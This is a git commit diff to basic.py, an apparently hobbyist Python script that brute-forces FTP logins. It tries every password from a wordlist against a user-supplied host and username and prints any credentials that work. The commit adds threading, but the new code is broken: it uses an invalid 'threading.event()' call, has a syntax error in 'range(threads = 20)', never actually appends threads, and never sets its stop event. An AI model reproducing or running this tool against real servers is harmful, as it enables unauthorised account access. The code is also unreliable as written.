ee25c8f6c0b0056c611942379675c0c24c98031b
err0rgod <ndgaming458@gmail.com>
2025-07-30 20:04:11 +0530

    added some basic threading

--- basic.py
+++ basic.py
@@ -1,14 +1,14 @@
 import ftplib
 import argparse
-
-
+import threading
+from  queue import Queue
 
 parser = argparse.ArgumentParser(description="Basic FTP tester")
 
 
 parser.add_argument("-ho","--host",required=True, type=str, help="Enter the target to test ftp")
 parser.add_argument("-p","--passfile",required=True,type=str,help="Enter the path of file containing password list")
-parser.add_argument("-t","--threads",type=int,help="enter the number of threads")
+parser.add_argument("-t","--threads",type=int,help="enter the number of threads. Default : 20")
 parser.add_argument("-u","--user",required=True,type=str,help="enter the Username to connect to provided host")
 
 args = parser.parse_args()
@@ -18,7 +18,7 @@ args = parser.parse_args()
 host = args.host
 user = args.user
 passfile = args.passfile
-
+threads = args.threads
 
 
 def passwd(passfile):
@@ -26,10 +26,36 @@ def passwd(passfile):
         return[line.strip('\n') for line in f]
 
 passwords = passwd(passfile)
+passwords_iter = iter(passwords)
+event_done = threading.event()
 
 
 
-for password in passwords:
+def workers():
+    while not event_done.is_set():
+        try:
+            password = next(passwords_iter)
+        except StopIteration:
+            break
+        try:
+            with ftplib.FTP() as serve:
+                serve.connect(host,21,timeout=5)
+                serve.login(user,password)
+                print("||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||")
+                print("===========================================================================\n")
+                print(" The Password was Found and Connection was Success\n")
+                print(f"Connect with {host} as {user}  :   {password}\n")
+                break
+        
+        except Exception as e:
+            print(f"Connection failed with {user}  :   {password}")
+
+
+
+
+
+
+'''for password in passwords:
     try:
         with ftplib.FTP() as serve:
             serve.connect(host,21,timeout=5)
@@ -42,5 +68,17 @@ for password in passwords:
 
 
     except Exception as e:
-        print(f"Connection failed with {user}  :   {password}")
+        print(f"Connection failed with {user}  :   {password}")'''
 
+
+
+threads = []
+for _ in range(threads = 20):
+    t= threading.Thread(target=workers)
+    t.start()
+    threads.append
+
+
+
+for t in threads:
+    t.join()
